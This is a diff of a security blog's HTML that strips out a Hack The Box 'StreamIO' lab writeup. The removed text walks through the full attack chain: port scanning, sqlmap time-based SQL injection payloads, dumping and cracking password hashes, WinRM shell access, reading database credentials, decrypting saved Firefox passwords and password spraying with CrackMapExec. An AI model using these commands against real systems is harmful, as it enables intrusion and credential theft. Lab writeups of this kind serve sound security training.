@@ -44,7 +44,7 @@
 
 
   <meta property="og:site_name" content="Security Blog"/>
-  <meta property="og:title" content="HTB - StreamIO - Writeup"/>
+  <meta property="og:title" content="[Encrypted content ahead] HTB - StreamIO - Writeup"/>
   <meta property="og:description" content="Click on &#34;Continue Reading&#34; to activate the password field."/>
   <meta property="og:locale" content="en_US"/>
   <meta property="og:url" content="/drafts/htb-streamio-writeup.html"/>
@@ -61,7 +61,7 @@
   <meta property="article:tag" content="#writeup"/>
   <meta property="og:image" content="/images/profile.jpg">
 
-  <title>Security Blog &ndash; HTB - StreamIO - Writeup</title>
+  <title>Security Blog &ndash; [Encrypted content ahead] HTB - StreamIO - Writeup</title>
 
 </head>
 <body class="light-theme">
@@ -117,7 +117,7 @@
 <article class="single">
   <header>
       
-    <h1 id="htb-streamio-writeup">HTB - StreamIO - Writeup</h1>
+    <h1 id="htb-streamio-writeup">[Encrypted content ahead] HTB - StreamIO - Writeup</h1>
     <p>
       Posted on Tue 14 June 2022 in <a href="/category/htb.html">htb</a>
 
@@ -126,715 +126,109 @@
 
 
   <div>
-    <h1>Reconnaissance</h1>
-<p>We have an IP, so we start with the usual, a simple port scan using nmap.</p>
-<div class="highlight"><pre><span></span><code><span class="c1"># Nmap 7.80 scan initiated Wed Jun 15 08:35:18 2022 as: nmap -p - -T4 -sV -oA nmap_streamio 10.10.11.158</span>
-Nmap scan report <span class="k">for</span> streamio <span class="o">(</span><span class="m">10</span>.10.11.158<span class="o">)</span>
-Host is up <span class="o">(</span><span class="m">0</span>.026s latency<span class="o">)</span>.
-Not shown: <span class="m">65517</span> filtered ports
-PORT      STATE SERVICE       VERSION
-<span class="m">53</span>/tcp    open  domain?
-<span class="m">80</span>/tcp    open  http          Microsoft IIS httpd <span class="m">10</span>.0
-<span class="m">88</span>/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="o">(</span>server time: <span class="m">2022</span>-06-15 <span class="m">13</span>:14:25Z<span class="o">)</span>
-<span class="m">135</span>/tcp   open  msrpc         Microsoft Windows RPC
-<span class="m">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-<span class="m">389</span>/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: streamIO.htb0., Site: Default-First-Site-Name<span class="o">)</span>
-<span class="m">443</span>/tcp   open  ssl/http      Microsoft HTTPAPI httpd <span class="m">2</span>.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-<span class="m">445</span>/tcp   open  microsoft-ds?
-<span class="m">464</span>/tcp   open  kpasswd5?
-<span class="m">593</span>/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP <span class="m">1</span>.0
-<span class="m">636</span>/tcp   open  tcpwrapped
-<span class="m">5985</span>/tcp  open  http          Microsoft HTTPAPI httpd <span class="m">2</span>.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-<span class="m">9389</span>/tcp  open  mc-nmf        .NET Message Framing
-<span class="m">49667</span>/tcp open  msrpc         Microsoft Windows RPC
-<span class="m">49673</span>/tcp open  ncacn_http    Microsoft Windows RPC over HTTP <span class="m">1</span>.0
-<span class="m">49674</span>/tcp open  msrpc         Microsoft Windows RPC
-<span class="m">49701</span>/tcp open  msrpc         Microsoft Windows RPC
-<span class="m">61653</span>/tcp open  msrpc         Microsoft Windows RPC
-<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port53-TCP:V<span class="o">=</span><span class="m">7</span>.80%I<span class="o">=</span><span class="m">7</span>%D<span class="o">=</span><span class="m">6</span>/15%Time<span class="o">=</span>62A97E0B%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
-SF:ersionBindReqTCP,20,<span class="s2">&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\</span>
-<span class="s2">SF:x04bind\0\0\x10\0\x03&quot;</span><span class="o">)</span><span class="p">;</span>
-Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-<span class="c1"># Nmap done at Wed Jun 15 08:39:11 2022 -- 1 IP address (1 host up) scanned in 233.05 seconds</span>
-</code></pre></div>
-
-<p>No RDP, but ldap port open and responding with domain information, the host might be an active directory domain controller. Let's see what the http/https ports show.</p>
-<div class="highlight"><pre><span></span><code>curl --silent -v http://$TIP
-</code></pre></div>
-
-<div class="highlight"><pre><span></span><code>*   Trying 10.10.11.158:80...
-* TCP_NODELAY set
-* Connected to 10.10.11.158 (10.10.11.158) port 80 (#0)
-&gt; GET / HTTP/1.1
-&gt; Host: 10.10.11.158
-&gt; User-Agent: curl/7.68.0
-&gt; Accept: */*
-&gt; 
-* Mark bundle as not supporting multiuse
-&lt; HTTP/1.1 200 OK
-&lt; Content-Type: text/html
-&lt; Last-Modified: Tue, 22 Feb 2022 10:46:01 GMT
-&lt; Accept-Ranges: bytes
-&lt; ETag: &quot;b23de861d927d81:0&quot;
-&lt; Server: Microsoft-IIS/10.0
-&lt; X-Powered-By: ASP.NET
-&lt; Date: Wed, 15 Jun 2022 13:24:29 GMT
-&lt; Content-Length: 703
-&lt; 
-{ [703 bytes data]
-* Connection #0 to host 10.10.11.158 left intact
-&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Strict//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd&quot;&gt;
-&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;
-&lt;head&gt;
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=iso-8859-1&quot; /&gt;
-&lt;title&gt;IIS Windows Server&lt;/title&gt;
-&lt;style type=&quot;text/css&quot;&gt;
-&lt;!--
-body {
-    color:#000000;
-    background-color:#0072C6;
-    margin:0;
-}
-
-#container {
-    margin-left:auto;
-    margin-right:auto;
-    text-align:center;
-    }
-
-a img {
-    border:none;
-}
-
---&gt;
-&lt;/style&gt;
-&lt;/head&gt;
-&lt;body&gt;
-&lt;div id=&quot;container&quot;&gt;
-&lt;a href=&quot;http://go.microsoft.com/fwlink/?linkid=66138&amp;amp;clcid=0x409&quot;&gt;&lt;img src=&quot;iisstart.png&quot; alt=&quot;IIS&quot; width=&quot;960&quot; height=&quot;600&quot; /&gt;&lt;/a&gt;
-&lt;/div&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre></div>
-
-<p>Standard IIS site..., https responds with a 404...
-Maybe <a href="https://github.com/projectdiscovery/nuclei#install-nuclei">nuclei</a> can find more information.
-<img alt="Nuclei http" src="/images/htb/streamio/htb_streamio_nuclei_http.PNG">
-Not for http.. Nothing intersting, but https leads to more information
-<img alt="Nuclei https" src="/images/htb/streamio/htb_streamio_nuclei_https.PNG">
-You can see, nuclei found two DNS names inside the SSL certificate:
-- <strong>streamIO.htb</strong>
-- <strong>watch.streamIO.htb</strong></p>
-<p>Maybe the webserver responds differently whem we talk to the domain instead of the IP.
-We specify the hostnames in <code>/etc/hosts</code>. If we ran our own DNS resolver, we could also specify the addresses there.
-Include this</p>
-<div class="highlight"><pre><span></span><code>10.10.11.158    streamio streamIO.htb0 watch.streamIO.htb streamio.htb
-</code></pre></div>
-
-<p>The http response is still the same when requesting <code>http://streamio.htb</code>, but <code>https://streamio.htb</code> now responds with a "real" website.
-<img alt="streamio https site" src="/images/htb/streamio/htb_streamio_https_site.PNG">
-Also <code>https://watch.streamio.htb</code> reveals a website.
-<img alt="streamio https site" src="/images/htb/streamio/htb_streamio_watch_https_site.PNG"></p>
-<p>Nuclei couln't find any vulnerabilities for both websites. Time to crawl both sites.
-feroxbuster found some available endpoints on <code>https://streamio.htb</code></p>
-<div class="highlight"><pre><span></span><code>./feroxbuster -k -u https://streamio.htb/ -x php,html,txt -w directory-list-lowercase-2.3-small.txt -t <span class="m">100</span> -o feroxbuster_streamio.htb.log
-
-<span class="m">200</span>      GET      395l      915w    13497c https://streamio.htb/
-<span class="m">301</span>      GET        2l       10w      151c https://streamio.htb/images <span class="o">=</span>&gt; https://streamio.htb/images/
-<span class="hll"><span class="m">200</span>      GET      121l      291w     4500c https://streamio.htb/register.php
-</span><span class="hll"><span class="m">200</span>      GET      206l      430w     6434c https://streamio.htb/contact.php
-</span><span class="hll"><span class="m">200</span>      GET      395l      915w    13497c https://streamio.htb/index.php
-</span><span class="hll"><span class="m">200</span>      GET      231l      571w     7825c https://streamio.htb/about.php
-</span><span class="hll"><span class="m">200</span>      GET      111l      269w     4145c https://streamio.htb/login.php
-</span><span class="hll"><span class="m">301</span>      GET        2l       10w      150c https://streamio.htb/admin <span class="o">=</span>&gt; https://streamio.htb/admin/
-</span><span class="m">301</span>      GET        2l       10w      157c https://streamio.htb/admin/images <span class="o">=</span>&gt; https://streamio.htb/admin/images/
-<span class="m">403</span>      GET        1l        1w       18c https://streamio.htb/admin/index.php
-<span class="m">301</span>      GET        2l       10w      148c https://streamio.htb/css <span class="o">=</span>&gt; https://streamio.htb/css/
-<span class="m">301</span>      GET        2l       10w      154c https://streamio.htb/admin/css <span class="o">=</span>&gt; https://streamio.htb/admin/css/
-<span class="m">301</span>      GET        2l       10w      147c https://streamio.htb/js <span class="o">=</span>&gt; https://streamio.htb/js/
-<span class="m">301</span>      GET        2l       10w      153c https://streamio.htb/admin/js <span class="o">=</span>&gt; https://streamio.htb/admin/js/
-<span class="m">302</span>      GET        0l        0w        0c https://streamio.htb/logout.php <span class="o">=</span>&gt; https://streamio.htb/
-<span class="m">301</span>      GET        2l       10w      150c https://streamio.htb/fonts <span class="o">=</span>&gt; https://streamio.htb/fonts/
-<span class="hll"><span class="m">200</span>      GET        2l        6w       58c https://streamio.htb/admin/master.php
-</span><span class="m">301</span>      GET        2l       10w      156c https://streamio.htb/admin/fonts <span class="o">=</span>&gt; https://streamio.htb/admin/fonts/
-</code></pre></div>
-
-<p>While trying to analyse <code>https://watch.streamio.htb</code>, feroxbuster and nuclei threw an error or didn't output any results. I thought at first, that the entry in <code>/etc/hosts</code> was wrong, but the entries were correct. I could't fingure why streamio.htb resolved correctly but watch.streamio.htb didn't. To resolve this I had to set up my own DNS resolver as suggested earlier in this article.
-Because I use Ubuntu 20.04 as my pwnbox, I can install dnscrypt-proxy from the repository, it's up to date enough.</p>
-<div class="highlight"><pre><span></span><code>apt install dnscrypt-proxy
-</code></pre></div>
-
-<p>You don't even have to disable existing name server/resolver on the system. dnscrypt-proxy listens by default and the address 127.0.2.1.
-I edit the default config slightly, I add the following content just after <code>server_names = ['cloudflare']</code> in <code>/etc/dnscrypt-proxy/dnscrypt-proxy.toml</code>.</p>
-<div class="highlight"><pre><span></span><code>cloaking_rules = &#39;cloaking_rules.txt&#39;
-</code></pre></div>
-
-<p>We add the file <code>/etc/dnscrypt-proxy/cloaking_rules.txt</code> with the content</p>
-<div class="highlight"><pre><span></span><code>*.streamio.htb  10.10.11.158
-streamio.htb  10.10.11.158
-</code></pre></div>
-
-<p>and to <code>/etc/resolv.conf</code> we add <code>nameserver    127.0.2.1</code> as first nameserver entry. Now we remove the entries from <code>/etc/hosts</code> regarding streamio.htb. 
-Restart the service</p>
-<div class="highlight"><pre><span></span><code>systemctl restart dnscrypt-proxy
-</code></pre></div>
-
-<p>Now every DNS request to *.streamio.htb resolves to the specified IP.
-nuclei now returns some info for <code>watch.streamio.htb</code>, but nothing intersting. But feroxbuster could find some endpoints</p>
-<div class="highlight"><pre><span></span><code>200      GET       78l      245w     2829c https://watch.streamio.htb/
-200      GET     7193l    19558w   253887c https://watch.streamio.htb/search.php
-200      GET       78l      245w     2829c https://watch.streamio.htb/index.php
-200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php
-301      GET        2l       10w      157c https://watch.streamio.htb/static =&gt; https://watch.streamio.htb/static/
-</code></pre></div>
-
-<p>Soooo let's look on all those endpoints...
-Starting with the <code>register.php</code> endpoint. We can type in a username and a password. The site will always respond with "Account created" nevertheless, we registered the username before.</p>
-<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_register.php.PNG">
-<img alt="account created" src="/images/htb/streamio/streamio.htb_register_account_created.php.PNG"></p>
-<p>But when we try to login with our newly created user, the login fails. Later on, we will learn, that only one user can login successfully.</p>
-<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_login_failed.php.PNG"></p>
-<p><code>contact.php</code> had a form available, but did't lead to anything.
-<code>/admin/index.php</code> showed <strong>FORBIDDEN</strong>, but
-<code>admin/master.php</code> showed this</p>
-<p><img alt="register.php" src="/images/htb/streamio/streamio.htb_admin_master.php.PNG"></p>
-<h1>SQL Injection</h1>
-<p><code>watch.streamio.htb/search.php</code> didn't liked SQL injection tries and redirected to <code>blocked.php</code></p>
-<p><img alt="register.php" src="/images/htb/streamio/watch.streamio.htb_search_blocked.php.PNG"></p>
-<p>Let's see what <a href="https://github.com/sqlmapproject/sqlmap">sqlmap</a> can do for us. Trying all those found endpoints, I will show the results for <code>login.php</code></p>
-<div class="highlight"><pre><span></span><code>sqlmap.py -u https://streamIO.htb/login.php --method POST --data <span class="nv">username</span><span class="o">=</span>FUZZ<span class="p">&amp;</span><span class="nv">password</span><span class="o">=</span>FUZZ --batch --time-sec <span class="m">1</span>
-</code></pre></div>
-
-<p>sqlmap was lucky, sort of lucky because the injection is time based... ZZZZZzzzzzZZZZZzzzzz</p>
-<div class="highlight"><pre><span></span><code>sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
----
-Parameter: username (POST)
-    Type: stacked queries
-    Title: Microsoft SQL Server/Sybase stacked queries (comment)
-    Payload: username=FUZZ&#39;;WAITFOR DELAY &#39;0:0:1&#39;--&amp;password=FUZZ
----
-web server operating system: Windows 10 or 2016 or 2019
-web application technology: Microsoft IIS 10.0, PHP, PHP 7.2.26
-back-end DBMS: Microsoft SQL Server 2019
-</code></pre></div>
-
-<p>Using sqlmap again, we retrieve the available datbases</p>
-<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> --dbs
-available databases <span class="o">[</span><span class="m">5</span><span class="o">]</span>:
-<span class="o">[</span>*<span class="o">]</span> model
-<span class="o">[</span>*<span class="o">]</span> msdb
-<span class="o">[</span>*<span class="o">]</span> STREAMIO
-<span class="o">[</span>*<span class="o">]</span> streamio_backup
-<span class="o">[</span>*<span class="o">]</span> tempdb
-</code></pre></div>
-
-<p>We couldn't extract any tables from <code>streamio_backup</code>, maybe due to missing permissions, but for <code>STREAMIO</code> it worked.</p>
-<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> -D STREAMIO --tables
-Database: STREAMIO
-<span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
-+--------+
-<span class="p">|</span> movies <span class="p">|</span>
-<span class="p">|</span> users  <span class="p">|</span>
-+--------+
-</code></pre></div>
-
-<p>Great a <code>users</code> table. Extracting now the columns...</p>
-<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --batch --time-sec <span class="m">1</span> -D STREAMIO -T users --columns
-Database: STREAMIO
-Table: users
-<span class="o">[</span><span class="m">4</span> columns<span class="o">]</span>
-+----------+-------+
-<span class="p">|</span> Column   <span class="p">|</span> Type  <span class="p">|</span>
-+----------+-------+
-<span class="p">|</span> id       <span class="p">|</span> int   <span class="p">|</span>
-<span class="p">|</span> is_staff <span class="p">|</span> bit   <span class="p">|</span>
-<span class="p">|</span> password <span class="p">|</span> nchar <span class="p">|</span>
-<span class="p">|</span> username <span class="p">|</span> nchar <span class="p">|</span>
-+----------+-------+
-</code></pre></div>
-
-<p>There are around 30 users in that table, depending on how many registered at that time.
-I selected those usernames where <strong>is_staff</strong> is set to <strong>0</strong>.</p>
-<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> --time-sec <span class="m">1</span> --sql-query<span class="o">=</span><span class="s2">&quot;SELECT username FROM STREAMIO..users WHERE is_staff=0&quot;</span>
-</code></pre></div>
-
-<p>It only returned one username... <strong>admin</strong> and I retrieved the password, probably MD5 <strong>665a50ac9eaa781e4f7f04199db97a11</strong>. Crackstation revealed the password <strong>paddpadd</strong>. The login with those credentials still fails.
-So we dump all usernames, limiting the dumped characters to 10 chars. This took around 30 minutes.</p>
-<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/login.php&quot;</span> --method POST --data <span class="s2">&quot;username=FUZZ&amp;password=FUZZ&quot;</span> -D STREAMIO -T users -C username --dump --batch --time-sec <span class="m">1</span> --last <span class="m">10</span>
-Database: STREAMIO
-Table: users
-<span class="o">[</span><span class="m">30</span> entries<span class="o">]</span>
-+-----------+
-<span class="p">|</span> username  <span class="p">|</span>
-+-----------+
-<span class="p">|</span> James     <span class="p">|</span>
-<span class="p">|</span> Theodore  <span class="p">|</span>
-<span class="p">|</span> Samantha  <span class="p">|</span>
-<span class="p">|</span> Lauren    <span class="p">|</span>
-<span class="p">|</span> William   <span class="p">|</span>
-<span class="p">|</span> Sabrina   <span class="p">|</span>
-<span class="p">|</span> Robert    <span class="p">|</span>
-<span class="p">|</span> Thane     <span class="p">|</span>
-<span class="p">|</span> Carmon    <span class="p">|</span>
-<span class="p">|</span> Barry     <span class="p">|</span>
-<span class="p">|</span> Oliver    <span class="p">|</span>
-<span class="p">|</span> Michelle  <span class="p">|</span>
-<span class="p">|</span> Gloria    <span class="p">|</span>
-<span class="p">|</span> Victoria  <span class="p">|</span>
-<span class="p">|</span> Alexendra <span class="p">|</span>
-<span class="p">|</span> Baxter    <span class="p">|</span>
-<span class="p">|</span> Clara     <span class="p">|</span>
-<span class="p">|</span> Barbra    <span class="p">|</span>
-<span class="p">|</span> Lenord    <span class="p">|</span>
-<span class="p">|</span> Austin    <span class="p">|</span>
-<span class="p">|</span> Garfield  <span class="p">|</span>
-<span class="p">|</span> Juliette  <span class="p">|</span>
-<span class="p">|</span> Victor    <span class="p">|</span>
-<span class="p">|</span> Lucifer   <span class="p">|</span>
-<span class="p">|</span> Bruno     <span class="p">|</span>
-<span class="p">|</span> Diablo    <span class="p">|</span>
-<span class="p">|</span> Robin     <span class="p">|</span>
-<span class="p">|</span> Stan      <span class="p">|</span>
-<span class="p">|</span> yoshihide <span class="p">|</span>
-<span class="p">|</span> admin     <span class="p">|</span>
-+-----------+
-</code></pre></div>
-
-<p>Now i could dump all passwords, respectivly the MD5 hashes, but I try another way first.</p>
-<p>There are 2 usernames that stand out.</p>
-<ol>
-<li>yoshihide</li>
-<li>admin</li>
-</ol>
-<p>I try to register <strong>admin</strong> with my own password and log in. No success.</p>
-<p>I try to register <strong>yoshihide</strong> with my own password and log in. <strong>SUCCESS</strong></p>
-<p>Finally the log in with my own registered password worked and I can navigate to the <code>/admin/</code> site.</p>
-<p><img alt="admin interface" src="/images/htb/streamio/streamio.htb_admin.PNG"></p>
-<p>So the endpoints seem to allow deletion of users and movies. I suspect some sort of "DELETE" SQL query behind those request and sqlmap could find again an injection, but again time based...</p>
-<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/admin/?movie&quot;</span> --method<span class="o">=</span>POST --data <span class="s2">&quot;movie_id=1666&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=jedeq7831tbnm0b12lneefghmd&quot;</span> --dbms<span class="o">=</span><span class="s2">&quot;Microsoft SQL Server&quot;</span>
-sqlmap resumed the following injection point<span class="o">(</span>s<span class="o">)</span> from stored session:
----
-Parameter: movie_id <span class="o">(</span>POST<span class="o">)</span>
-    Type: stacked queries
-    Title: Microsoft SQL Server/Sybase stacked queries <span class="o">(</span>comment<span class="o">)</span>
-    Payload: <span class="nv">movie_id</span><span class="o">=</span><span class="m">1666</span><span class="p">;</span>WAITFOR DELAY <span class="s1">&#39;0:0:5&#39;</span>--
-
-    Type: time-based blind
-    Title: Microsoft SQL Server/Sybase time-based blind <span class="o">(</span>IF<span class="o">)</span>
-    Payload: <span class="nv">movie_id</span><span class="o">=</span><span class="m">1666</span> WAITFOR DELAY <span class="s1">&#39;0:0:5&#39;</span>
----
-</code></pre></div>
-
-<p>This time the <strong>db_admin</strong> user is used to conduct those queries instead if the <strong>db_user</strong> before. Maybe we can access <strong>streamio_backup</strong> now.
-And yesssss, the tables enumeration worked.. more or less.. sqlmap had a hard time to retrieve those tables. Maybe the machine was under load at that time.</p>
-<div class="highlight"><pre><span></span><code>python sqlmap.py -u <span class="s2">&quot;https://streamIO.htb/admin/?movie&quot;</span> --method<span class="o">=</span>POST --data <span class="s2">&quot;movie_id=1666&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;PHPSESSID=jedeq7831tbnm0b12lneefghmd&quot;</span>  --dbms<span class="o">=</span><span class="s2">&quot;Microsoft SQL Server&quot;</span> --output-dir<span class="o">=</span>~/venv3/htb/streamio/sqlmap/ -D streamio_backup --tables --fresh-queries
-Database: streamio_backup
-<span class="o">[</span><span class="m">2</span> tables<span class="o">]</span>
-+--------+
-<span class="p">|</span> movies <span class="p">|</span>
-<span class="p">|</span> users  <span class="p">|</span>
-+--------+
-</code></pre></div>
-
-<p>The table <strong>users</strong> has 3 columns <code>id, password, username</code>. The retrieving was very slow, retrieving 2 rows took 45 minutes.</p>
-<div class="highlight"><pre><span></span><code>nikk37 - 389d14cb8e4e9b94b137deb1caf0612a
-yoshihide - b779ba15cedfd22a023c4d8bcf5f2332
-</code></pre></div>
-
-<p>Again MD5 hashes...</p>
-<div class="highlight"><pre><span></span><code>389d14cb8e4e9b94b137deb1caf0612a    md5 get_dem_girls2@yahoo.com
-b779ba15cedfd22a023c4d8bcf5f2332    md5 66boysandgirls..
-</code></pre></div>
-
-<h1>Pivoting</h1>
-<p>Great both cracked, let's see if SMB login works.</p>
-<div class="highlight"><pre><span></span><code><span class="c1"># nikk37 worked</span>
-cme smb streamio.htb -u nikk37 -p <span class="s1">&#39;get_dem_girls2@yahoo.com&#39;</span>
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span>.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:streamIO.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         <span class="m">10</span>.10.11.158    <span class="m">445</span>    DC               <span class="o">[</span>+<span class="o">]</span> streamIO.htb<span class="se">\n</span>ikk37:get_dem_girls2@yahoo.com
-
-<span class="c1"># and whats even better? winrm worked too</span>
-
-evil-winrm  -i <span class="nv">$TIP</span> -u nikk37 -p <span class="s1">&#39;get_dem_girls2@yahoo.com&#39;</span>
-
-Evil-WinRM shell v3.3
-
-Info: Establishing connection to remote endpoint
-
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>ocuments&gt;
-
-<span class="c1"># and there is the user flag</span>
-*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>esktop&gt; ls
-
-
-    Directory: C:<span class="se">\U</span>sers<span class="se">\n</span>ikk37<span class="se">\D</span>esktop
-
-
-Mode                LastWriteTime         Length Name
-----                -------------         ------ ----
--ar---        <span class="m">6</span>/17/2022   <span class="m">5</span>:17 AM             <span class="m">34</span> user.txt
-</code></pre></div>
-
-<p>Now I go for the root flag. </p>
-<div class="highlight"><pre><span></span><code><span class="n">net</span> <span class="n">user</span>
-
-<span class="n">User</span> <span class="n">accounts</span> <span class="k">for</span> <span class="p">\\</span>
-
-<span class="p">-------------------------------------------------------------------------------</span>
-<span class="n">Administrator</span>            <span class="n">Guest</span>                    <span class="n">JDgodd</span>
-<span class="n">krbtgt</span>                   <span class="n">Martin</span>                   <span class="n">nikk37</span>
-<span class="n">yoshihide</span>
-</code></pre></div>
-
-<p><code>net user</code> tells us about the other user accounts. I tried already the decrypted password for yoshihide, but it didn't work. Now going for <strong>Martin</strong> and <strong>JDgodd</strong>.
-It's always a good idea to search the filesystem.
-We have access to the web server scripts in <code>C:\inetpub\</code> where we could find the db credentials</p>
-<div class="highlight"><pre><span></span><code><span class="nb">Get-ChildItem</span> <span class="n">-recurse</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-pattern</span> <span class="s2">&quot;db_&quot;</span> <span class="p">|</span> <span class="nb">group </span><span class="n">path</span> <span class="p">|</span> <span class="nb">select </span><span class="n">name</span>
-
-<span class="n">Name</span>
-<span class="p">----</span>
-<span class="n">C</span><span class="p">:\</span><span class="n">inetpub</span><span class="p">\</span><span class="n">streamio</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">admin</span><span class="p">\</span><span class="n">index</span><span class="p">.</span><span class="n">php</span>
-<span class="c"># and</span>
-<span class="nb">type </span><span class="s2">&quot;C:/inetpub/streamio.htb/admin/index.php&quot;</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="n">db_</span>
-
-<span class="nv">$connection</span> <span class="p">=</span> <span class="n">array</span><span class="p">(</span><span class="s2">&quot;Database&quot;</span><span class="p">=&gt;</span><span class="s2">&quot;STREAMIO&quot;</span><span class="p">,</span> <span class="s2">&quot;UID&quot;</span> <span class="p">=&gt;</span> <span class="s2">&quot;db_admin&quot;</span><span class="p">,</span> <span class="s2">&quot;PWD&quot;</span> <span class="p">=&gt;</span> <span class="s1">&#39;B1@hx31234567890&#39;</span><span class="p">);</span>
-</code></pre></div>
-
-<p>But there is nothing we can do with those credentials, we already know what's inside the database. </p>
-<p>Sooo keep on digging on the box itself using the winrm shell. After a while I found some Firefox data inside <code>C:\Users\nikk37\Appdata\Roaming\Mozilla\Firefox</code>
-The very great Evil-WinRM can download the whole folder for us.</p>
-<div class="highlight"><pre><span></span><code><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">nikk37</span><span class="p">\</span><span class="n">Appdata</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Mozilla</span><span class="p">&gt;</span> <span class="n">download</span> <span class="s2">&quot;C:/Users/nikk37/Appdata/Roaming/Mozilla/Firefox/&quot;</span>
-<span class="n">Info</span><span class="p">:</span> <span class="n">Downloading</span> <span class="n">C</span><span class="p">:/</span><span class="n">Users</span><span class="p">/</span><span class="n">nikk37</span><span class="p">/</span><span class="n">Appdata</span><span class="p">/</span><span class="n">Roaming</span><span class="p">/</span><span class="n">Mozilla</span><span class="p">/</span><span class="n">Firefox</span><span class="p">/</span> <span class="n">to</span> <span class="p">./</span><span class="n">Firefox</span>
-
-
-<span class="n">Info</span><span class="p">:</span> <span class="n">Download</span> <span class="n">successful</span><span class="p">!</span>
-</code></pre></div>
-
-<p>After a short while we have a copy of the Firefox folder on our local system. Now we can use some other tools, to look if passwords are saved in Firefox.
-<a href="https://github.com/Unode/firefox_decrypt">firefox_decrypt</a> worked very well, but sadly only with Python 3.9+. Ubuntu 20.04 ships with Python 3.8.
-Nevertheless</p>
-<div class="highlight"><pre><span></span><code>python firefox_decrypt.py Firefox/
-Select the Mozilla profile you wish to decrypt
-<span class="m">1</span> -&gt; Profiles/5rwivk2l.default
-<span class="m">2</span> -&gt; Profiles/br53rxeg.default-release
-<span class="m">2</span>
-
-Website:   https://slack.streamio.htb
-Username: <span class="s1">&#39;admin&#39;</span>
-Password: <span class="s1">&#39;JDg0dd1s@d0p3cr3@t0r&#39;</span>
-
-Website:   https://slack.streamio.htb
-Username: <span class="s1">&#39;nikk37&#39;</span>
-Password: <span class="s1">&#39;n1kk1sd0p3t00:)&#39;</span>
-
-Website:   https://slack.streamio.htb
-Username: <span class="s1">&#39;yoshihide&#39;</span>
-Password: <span class="s1">&#39;paddpadd@12&#39;</span>
-
-Website:   https://slack.streamio.htb
-Username: <span class="s1">&#39;JDgodd&#39;</span>
-Password: <span class="s1">&#39;password@12&#39;</span>
-</code></pre></div>
-
-<p>And again some passwords, that we test on SMB. I put the usernames in a text file and also the passwords, to cross check all passwords.</p>
-<div class="highlight"><pre><span></span><code>cat users.txt
-JDgodd
-Administrator
-yoshihide
-Martin
-</code></pre></div>
-
-<p>I left out nikk37 because we already have access to this account.</p>
-<div class="highlight"><pre><span></span><code>cat passwords.txt
-JDg0dd1s@d0p3cr3@t0r
-n1kk1sd0p3t00:<span class="o">)</span>
-paddpadd@12
-password@12
-get_dem_girls2@yahoo.com
-66boysandgirls..
-</code></pre></div>
-
-<p>CrackMapExec does all the work for us.</p>
-<div class="highlight"><pre><span></span><code>cme smb <span class="nv">$TIP</span> -u users.txt -p passwords.txt  --continue-on-success
